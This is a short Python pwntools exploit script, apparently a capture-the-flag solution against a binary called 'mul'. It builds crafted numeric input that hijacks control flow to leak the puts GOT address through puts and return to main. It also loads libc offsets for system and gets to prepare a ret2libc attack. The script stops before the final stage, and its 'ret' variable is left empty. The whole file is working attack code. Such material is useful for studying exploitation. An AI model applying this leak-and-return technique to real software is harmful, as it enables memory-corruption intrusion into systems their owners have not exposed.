from pwn import *

mul = ELF('./mul')
main = mul.symbols['main']
puts = mul.symbols['puts']
puts_got = 0x804a010

libc = ELF('./libc.so.6')
gets_off = libc.symbols['gets'] # elf.symbols['gets']
system_off = libc.symbols['system']
puts_off = libc.symbols['puts']
ret = ''

print -1
print -1
print '1 '*20,0 # row v2 = 1 (i)
print '1 '*20 + str(puts) + ' ' + str(main) + ' ' + str(puts_got) + ' ' + '0\n' # column v1 = 400 (j)

# base = u32(r.recvrepeat()[:4]) - puts_off

